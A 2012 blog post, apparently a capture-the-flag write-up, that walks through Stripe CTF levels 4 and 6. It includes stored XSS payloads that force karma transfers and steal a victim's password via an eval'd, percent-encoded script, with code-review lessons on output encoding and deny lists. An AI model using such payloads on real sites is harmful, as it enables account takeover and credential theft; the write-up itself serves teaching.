<!doctype html>
<html lang="en" class="gradient-background">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Stripe CTF - XSS, CSRF (Levels 4 &amp; 6)</title>
		<meta name="description" content="Dave Risney&#39;s blog on web, coding, and things">
		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="deletethis.net">
		<link rel="alternate" href="/feed/feed.json" type="application/json" title="deletethis.net">

		<meta name="generator" content="Eleventy v2.0.0">

		<link rel="icon" type="image/svg+xml" href="/img/semicolon.svg">

		<link rel="me" href="https://github.com/david-risney">
		<link rel="me" href="https://infosec.exchange/@davidrisney">
		<link rel="me" href="mailto:david.risney@gmail.com">

		<style>
		@view-transition { navigation: auto; }

::view-transition-group(*) { animation-duration: 0.2s; }

@keyframes slide-in-from-left { from { translate: -150vw 0; } }
@keyframes slide-in-from-right { from { translate: 150vw 0; } }
@keyframes slide-out-to-left { to { translate: -150vw 0; } }
@keyframes slide-out-to-right { to { translate: 150vw 0; } }
@keyframes scale-up { from { scale: 0; } }
@keyframes scale-down { to { scale: 0; } }
@keyframes fade-in { from { opacity: 0; } }
@keyframes fade-out { to { opacity: 0; } }

html:active-view-transition-type(forwards, backwards) {
	:root { view-transition-name: none; }
	header { view-transition-name: header; }
	main { view-transition-name: main; }
	footer { view-transition-name: footer; }
}

html:active-view-transition-type(forwards) {
	&::view-transition-old(main) { animation-name: fade-out; }
	&::view-transition-new(main) { animation-name: fade-in; }
}

html:active-view-transition-type(backwards) {
	&::view-transition-old(main) { animation-name: fade-out; }
	&::view-transition-new(main) { animation-name: fade-in; }
}

html:active-view-transition-type(reload) {
	&::view-transition-old(root) { animation-name: fade-out; }
	&::view-transition-new(root) { animation-name: fade-in; }
}

/* Defaults */
:root {
	--font-family: Roboto, -apple-system, system-ui, sans-serif;
	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
}

/* Theme colors */
:root {
	--color-gray-20: #d0d0d0;
	--color-gray-50: #C0C0C0;
	--color-gray-90: #333;

	--background-color-rgb: 233, 233, 254;
	--background-color: rgb(var(--background-color-rgb));
	--background-color-slightly-transparent: rgba(var(--background-color-rgb), 0.75);

    --content-border: #272727;
    --content-background: #f0f0f5;

	--text-color: var(--color-gray-90);
	--text-color-link: #082840;
	--text-color-link-active: #5f2b48;
	--text-color-link-visited: #17050F;

	--syntax-tab-size: 2;
}

@media (prefers-color-scheme: dark) {
	:root {
		--color-gray-20: #e0e0e0;
		--color-gray-50: #C0C0C0;
		--color-gray-90: #dad8d8;

		--background-color-rgb: 21, 32, 43;

		/* --text-color is assigned to --color-gray-_ above */
		--text-color-link: #1493fb;
		--text-color-link-active: #6969f7;
		--text-color-link-visited: #a6a6f8;

		--content-border: #dad8d8;
		--content-background: #272727;
	}
}


/* Global stylesheet */
* {
	box-sizing: border-box;
}

html {
	padding: 0;
	margin: 0 auto;
	font-family: var(--font-family);
	color: var(--text-color);
	background-color: var(--background-color);
}

body {
	padding: 0;
	margin: 0 auto;
	font-family: var(--font-family);
	color: var(--text-color);
}
html {
	overflow-y: scroll;
}

@media (width <= 50em) {
	body {
		max-width: 25em;
	}

	#recap-container {
		display: grid;
		grid-template-columns: 1fr;
		grid-template-rows: repeat(1, 1fr);
		grid-template-areas: "blog"
			"mastodon";
		gap: 1em;
	}

	#blog-posts {
		grid-area: blog;
	}

	#mastodon-posts {
		grid-area: mastodon;
	}

	#meImage {
		display: none;
	}
}

@media (width > 50em) {
	body {
		max-width: 50em;
	}

	#recap-container {
		display: grid;
		grid-template-columns: 1fr 1fr;
		grid-template-areas: "blog mastodon";
		gap: 1em;
	}

	#blog-posts {
		grid-area: blog;
	}

	#mastodon-posts {
		grid-area: mastodon;
	}

	#floatyHeader {
		animation: headerChange auto linear;
		animation-timeline: scroll(root);
	}

	@keyframes headerChange {
		0% { 
			height: 300px; 
			margin-bottom: 0px; 
		}
		15% { 
			height: 4em; 
			margin-bottom: calc(300px - 4em);
		}
		100% { 
			height: 4em; 
			margin-bottom: calc(300px - 4em);
		}
	}

	#meImage {
		animation: imageChange auto linear;
		animation-timeline: scroll(root);
		/* rounded corners */
		border-radius: 5px;
		/* border */
		border: 2px solid var(--color-gray-20);
	}

	@keyframes imageChange {
		0% { 
			height: 200px; 
			width: 200px;
			opacity: 1;
			object-fit: cover;
			object-position: bottom;
		}
		15% { 
			height: 0px;
			width: 200px;
			opacity: 0;
			object-fit: cover;
			object-position: bottom;
		}
		100% { 
			height: 0px;
			width: 200px;
			opacity: 0;
			object-fit: cover;
			object-position: bottom;
		}
	}

	.home-link {
		animation: homelinkChange auto linear;
		animation-timeline: scroll(root);
	}

	@keyframes homelinkChange {
		0% { font-size: 3em; }
		15% { font-size: 1em; }
		100% { font-size: 1em; }
	}
}

#recap-container > * {
	width: 100%;
	max-width: 384px; /* based on width of recap container and margins in grid */
}

/* https://www.a11yproject.com/posts/how-to-hide-content/ */
.visually-hidden {
	clip: rect(0 0 0 0);
	clip-path: inset(50%);
	height: 1px;
	overflow: hidden;
	position: absolute;
	white-space: nowrap;
	width: 1px;
}

p:last-child {
	margin-bottom: 0;
}
p {
	line-height: 1.5;
}

li {
	line-height: 1.5;
}

a[href] {
	color: var(--text-color-link);
}
a[href]:visited {
	color: var(--text-color-link-visited);
}
a[href]:hover,
a[href]:active {
	color: var(--text-color-link-active);
}

main {
	padding: 1rem;
	background-color: var(--content-background);
}
main :first-child {
	margin-top: 0;
}

.links-nextprev {
	list-style: none;
	/* border-top: 1px dashed var(--color-gray-20); */
	padding: 1em 0;
}

table {
	margin: 1em 0;
}
table td,
table th {
	padding-right: 1em;
}

pre,
code {
	font-family: var(--font-family-monospace);
}
pre:not([class*="language-"]) {
	margin: .5em 0;
	line-height: 1.375; /* 22px /16 */
	-moz-tab-size: var(--syntax-tab-size);
	-o-tab-size: var(--syntax-tab-size);
	tab-size: var(--syntax-tab-size);
	-webkit-hyphens: none;
	-ms-hyphens: none;
	hyphens: none;
	direction: ltr;
	text-align: left;
	white-space: pre;
	word-spacing: normal;
	word-break: normal;
	overflow: auto;
}
code {
	word-break: break-all;
}

/* Header */
/* header is flex with the items aligned to the ends 
   so that the first item is left aligned and the
   last is right aligned */
#floatyHeader {
	display: grid;
	align-items: center;
	padding: 1em;
	grid-template-columns: 1fr auto;
	grid-template-areas: "home meImage"
		"home nav";
}

#meImage {
    height: 0px;
    width: 200px;
    opacity: 0;
    object-fit: cover;
    object-position: bottom;
}

#floatyHeader {
	top: 0px;
	position: sticky;
	height: 4em;
}

#floatyHeader {
	height: 100%;
	width: 100%;
	background: var(--background-color-slightly-transparent);
	backdrop-filter: blur(5px) saturate(200%);
}

#floatyHeader {
	border-bottom: 5px dashed var(--color-gray-20);
}

.home-link {
	grid-area: home;
	display: inline-block;
	width: 100%;
	height: 100%;
}

nav {
	grid-area: nav;
	height: 100%;
	width: 100%;
	display: flex;
	justify-content: space-between;
}

#meImage {
	grid-area: meImage;
}

.home-link {
	font-size: 1em; /* 16px /16 */
	font-weight: 700;
	margin-right: 2em;
}
.home-link:link:not(:hover) {
	text-decoration: none;
}

/* Nav */
.nav {
	width: 100%;
	display: flex;
	justify-content: right;
	padding: 0;
	margin: 0;
	list-style: none;
}
.nav-item {
	display: inline-block;
	margin-right: 1em;
}
.nav-item a[href]:not(:hover) {
	text-decoration: none;
}
.nav a[href][aria-current="page"] {
	text-decoration: underline;
}

/* Posts list */
.postlist {
	list-style: none;
	padding: 0;
	padding-left: 1.5rem;
}
.postlist-item {
	display: flex;
	flex-wrap: wrap;
	align-items: baseline;
	counter-increment: start-from -1;
	margin-bottom: 3em;
}
#blog-posts .postlist-item:before {
	display: inline-block;
	pointer-events: none;
	content: "" counter(start-from, decimal-leading-zero) ". ";
	line-height: 100%;
	text-align: right;
	margin-left: -1.5rem;
}
.postlist-item > p {
	overflow: hidden;

}

.avatar {
	border-radius: 5px;
	width: 32px;
	height: 32px;
	border: 1px solid var(--color-gray-20);
}
/*
.avatar
	margin-left: -38px;
	float: left;
}
.toot {
	padding-left: 36px;

}
	*/
.toot {
	display: grid;
	grid-template-columns: auto 1fr;
	grid-auto-rows: auto;
}
.toot > .avatar {
	grid-column: 1;
	/* avatar is all along the first column taking as many rows as it likes */
	grid-row: 1 / 10;
}
.toot > * {
	grid-column: 2;
	grid-row: auto;
}

.postlist-date,
.postlist-item:before {
	font-size: 0.8125em; /* 13px /16 */
	color: var(--color-gray-90);
}
.postlist-date {
	word-spacing: -0.5px;
}
.postlist-link {
	font-size: 1.1875em; /* 19px /16 */
	font-weight: 700;
	flex-basis: calc(100% - 1.5rem);
	padding-left: .25em;
	padding-right: .5em;
	text-underline-position: from-font;
	text-underline-offset: 0;
	text-decoration-thickness: 1px;
}
.postlist-item-active .postlist-link {
	font-weight: bold;
}

/* Tags */
.post-tag {
	display: inline-flex;
	align-items: center;
	justify-content: center;
	text-transform: capitalize;
	font-style: italic;
}
.postlist-item > .post-tag {
	align-self: center;
}

/* Tags list */
.post-metadata {
	display: inline-flex;
	flex-wrap: wrap;
	gap: .5em;
	list-style: none;
	padding: 0;
	margin: 0;
}
.post-metadata time {
	margin-right: 1em;
}

/* Direct Links / Markdown Headers */
.header-anchor {
	text-decoration: none;
	font-style: normal;
	font-size: 1em;
	margin-left: .1em;
}
a[href].header-anchor,
a[href].header-anchor:visited {
	color: transparent;
}
a[href].header-anchor:focus,
a[href].header-anchor:hover {
	text-decoration: underline;
}
a[href].header-anchor:focus,
:hover > a[href].header-anchor {
	color: #aaa;
}

h2 + .header-anchor {
	font-size: 1.5em;
}

/* logo is the size of the text and center aligned 
against the center of the text */
.logo {
	width: 1em;
	height: 1em;
	vertical-align: middle;
}
		</style>
		<script>
window.addEventListener("pageswap", async (e) => {
	if (e.viewTransition) {
		if (navigation.activation.from.url === navigation.activation.entry.url) {
			e.viewTransition.types.add('reload');
		} else {
			e.viewTransition.types.add('forwards');
		}
	}
});

window.addEventListener("pagereveal", async (e) => {
	if (e.viewTransition) {
		if (navigation.activation.from.url === navigation.activation.entry.url) {
			e.viewTransition.types.add('reload');
		} else {
			e.viewTransition.types.add('forwards');
		}
	}
});
		</script>
	</head>
	<body>
		<a href="#skip" class="visually-hidden">Skip to main content</a>

		<header id="floatyHeader">
			<a href="/dave/" class="home-link"><code>deletethis.net</code></a>
			
			<a href="/dave/about/"><img alt="A photo of me wearing a white button up shirt standing in front of generic office building windows." id="meImage" src="/dave/img/me-now.jpeg"></a>
			<nav>
				<h2 class="visually-hidden">Top level navigation menu</h2>
				<ul class="nav">
					<li class="nav-item"><a href="/dave/post/">Blog</a></li>
					<li class="nav-item"><a href="/dave/about/">About</a></li>
					<li class="nav-item"><a href="/feed/feed.xml"><!-- img class="logo" src="/img/rss-dark.svg" -->Feed</a></li>
				</ul>
			</nav>
		</header>

		<main id="skip">
			<h1>Stripe CTF - XSS, CSRF (Levels 4 &amp; 6)</h1>

<ul class="post-metadata">
	<li><time datetime="2012-09-10">2012 September 10</time></li>
</ul>

<div xmlns="http://www.w3.org/1999/xhtml"><div><p><a href="https://stripe-ctf.com/levels/4">Level 4</a> and <a href="https://stripe-ctf.com/levels/6">level 6</a> of the Stripe CTF had solutions around XSS.
  </p><h3>
    Level 4
  </h3><h4>
    Code
  </h4><pre><code>&gt; Registered Users <br /></code></pre><ul><br />
    &lt;%@registered_users.each do |user| %&gt;<br />
    &lt;%last_active = user[:last_active].strftime(&amp;apos;%H:%M:%S UTC&amp;apos;) %&gt;<br />
    &lt;%if @trusts_me.include?(user[:username]) %&gt;<br /><li><code><br />
      &lt;%= user[:username] %&gt;<br />
      (password: &lt;%= user[:password] %&gt;, last active &lt;%= last_active %&gt;)<br /></code></li><h4>
      Issue
    </h4><p>
      The level 4 web application lets you transfer karma to another user and in doing so you are also forced to expose your password to that user. The main user page displays a list of users who
      have transfered karma to you along with their password. The password is not HTML encoded so we can inject HTML into that user's browser. For instance, we could create an account with the
      following HTML as the password which will result in XSS with that HTML:
    </p><pre><code><script><![CDATA[
jQuery.post("https://level04-2.stripe-ctf.com/user-kxyiuircqs/transfer", {"to": "l", "amount": 1});
]]></script></code></pre>This HTML runs script that uses jQuery to post to the transfer URI resulting in a transfer of karma from the attacked user to the attacker user, and also the attacked user's
password.
    <h4>
      Notes
    </h4><p>
      Code review red flags in this case included lack of encoding when using user controlled content to create HTML content, storing passwords in plain text in the database, and displaying passwords
      generally. By design the web app shows users passwords which is a very bad idea.
    </p><h3>
      Level 6
    </h3><h4>
      Code
    </h4><pre><code><script><![CDATA[
 <br />    var username = "<%= @username %>"; <br />    var post_data = <%= @posts.to_json %>; <br /><br />    function escapeHTML(val) { <br />       return $(&amp;apos;<div/>&amp;apos;).text(val).html();<br />    } <br /><br />    function addPost(item) {<br />       var new_element = &amp;apos;<tr><th>&amp;apos; + escapeHTML(item[&amp;apos;user&amp;apos;]) + <br />          &amp;apos;</th><td><h4>&amp;apos; + escapeHTML(item[&amp;apos;title&amp;apos;]) + &amp;apos;</h4>&amp;apos; + <br />          escapeHTML(item[&amp;apos;body&amp;apos;]) + &amp;apos;</td></tr>&amp;apos;; $(&amp;apos;#posts > tbody:last&amp;apos;).prepend(new_element); <br />    } <br />    <br />    for(var i = 0; i < post_data.length; i++) { <br />       var item = post_data[i]; <br />       addPost(item); <br />    }; <br />
]]></script><br /><br />...<br /><br />    def self.safe_insert(table, key_values)<br />      key_values.each do |key, value|<br />        # Just in case people try to exfiltrate<br />        # level07-password-holder's password<br />        if value.kind_of?(String) &amp;&amp;<br />            (value.include?('"') || value.include?("'"))<br />          raise "Value has unsafe characters"<br />        end<br />      end<br /><br />      conn[table].insert(key_values)<br />    end</code></pre><h4>
      Issue
    </h4><p>
      This web app does a much better job than the level 4 app with HTML injection. They use encoding whenever creating HTML using user controlled data, however they don't use encoding when injecting
      JSON data into script (see post_data initialization above). This JSON data is the last five most recent messages sent on the app so we get to inject script directly. However, the system also
      ensures that no strings we write contains single or double quotes so we can't get out of the string in the JSON data directly. As it turns out, HTML lets you jump out of a script block using no
      matter where you are in script. For instance, in the middle of a value in some JSON data we can jump out of script. But we still want to run script, so we can jump right back in. So the frame
      so far for the message we're going to post is the following:
    </p><pre><script><![CDATA[
 our new code goes here 
]]></script><script><![CDATA[
var post_data = [];//</pre></code>Because we can't use quotes, actually running script takes some creativity.  I decided to percent-encode my script so quotes don't show up directly, represent this as a regular expression literal so I don't have to use quotes and to eval this script after decoding. There's likely plenty of other ways to get around lack of quotes.<code><pre>var code = /percent-encoded script here/.toString();<br />eval(decodeURIComponent(code.substring(1, code.length - 1))); </pre></code>Then the script I actually encode gets the password from the user-info page (which includes password), regexes the password out, and posts it as a message:<code><pre>jQuery.get("https://level06-2.stripe-ctf.com/user-nhboioztch/user_info").then(function(body) {<br />var password = /Password:<\/th>[^>]*>([^<]*)/.exec(body)[1];<br />var encPassword = "";<br />for (var idx = 0; idx < password.length; ++idx) {<br /> encPassword += "%";<br /> encPassword += password.charCodeAt(idx).toString(16);<br />}<br /><br />$("#content").val(encPassword);<br />$("#title").val("password");<br />document.getElementsByTagName("form")[0].submit();<br />});<br /></pre></code>Of course since messages can't include quotes, I have to encode the password before posting it as a message.</p><p>Altogether now here's my message:<code><pre>
]]></script><script><![CDATA[
var code = /%6A%51%75%65%72%79%2E%67%65%74%28%22%68%74%74%70%73%3A%2F%2F%6C%65%76%65%6C%30%36%2D%32%2E%73%74%72%69%70%65%2D%63%74%66%2E%63%6F%6D%2F%75%73%65%72%2D%6E%68%62%6F%69%6F%7A%74%63%68%2F%75%73%65%72%5F%69%6E%66%6F%22%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%62%6F%64%79%29%20%7B%0A%76%61%72%20%70%61%73%73%77%6F%72%64%20%3D%20%2F%50%61%73%73%77%6F%72%64%3A%3C%5C%2F%74%68%3E%5B%5E%3E%5D%2A%3E%28%5B%5E%3C%5D%2A%29%2F%2E%65%78%65%63%28%62%6F%64%79%29%5B%31%5D%3B%0A%76%61%72%20%65%6E%63%50%61%73%73%77%6F%72%64%20%3D%20%22%22%3B%0A%66%6F%72%20%28%76%61%72%20%69%64%78%20%3D%20%30%3B%20%69%64%78%20%3C%20%70%61%73%73%77%6F%72%64%2E%6C%65%6E%67%74%68%3B%20%2B%2B%69%64%78%29%20%7B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%22%25%22%3B%0A%09%65%6E%63%50%61%73%73%77%6F%72%64%20%2B%3D%20%70%61%73%73%77%6F%72%64%2E%63%68%61%72%43%6F%64%65%41%74%28%69%64%78%29%2E%74%6F%53%74%72%69%6E%67%28%31%36%29%3B%0A%7D%0A%0A%24%28%22%23%63%6F%6E%74%65%6E%74%22%29%2E%76%61%6C%28%65%6E%63%50%61%73%73%77%6F%72%64%29%3B%0A%24%28%22%23%74%69%74%6C%65%22%29%2E%76%61%6C%28%22%70%61%73%73%77%6F%72%64%22%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%22%66%6F%72%6D%22%29%5B%30%5D%2E%73%75%62%6D%69%74%28%29%3B%0A%7D%29%3B/.toString(); eval(decodeURIComponent(code.substring(1, code.length - 1))); 
]]></script><script><![CDATA[
var post_data= [];//</pre></code></p><h4>Notes</h4><p>Code review red flags included storing the password in plain text, displaying the password in an HTML page, lack of encoding when generating script on the server side, and a deny list of dangerous characters (quotes). Generally folks should use allow lists not deny lists.  You'll always forget something from your deny list or the platform will change out from under you adding new dangerous entries you didn't consider in your deny list.  In this case an allow list probably also doesn't make as much sense as encoding correctly. The first issue I ran into, was when posting the password I forgot to encode and the password did contain quotes. The second issue I ran into was that my injected script posts a message which results in a page refresh, which results in my injected script running again. This continues five times until my injected script message is pushed off the end. I had to be patient waiting for the target attacked user to login before I would refresh and post my own password.</p></div>
]]></script></pre></ul></div></div>

<ul class="links-nextprev"><li>Previous: <a rel="prev" href="/dave/2012-09/Stripe+CTF+-+Input+validation+-Levels+1+-+2-/">Stripe CTF - Input validation (Levels 1 &amp; 2)</a></li><li>Next: <a rel="next" href="/dave/2012-09/Stripe+CTF+-+Level+5/">Stripe CTF - Level 5</a></li>
</ul>

		</main>

		<footer></footer>

		<!-- Current page: /dave/2012-09/Stripe+CTF+-+XSS-+CSRF+-Levels+4+-+6-/ -->
	</body>
</html>
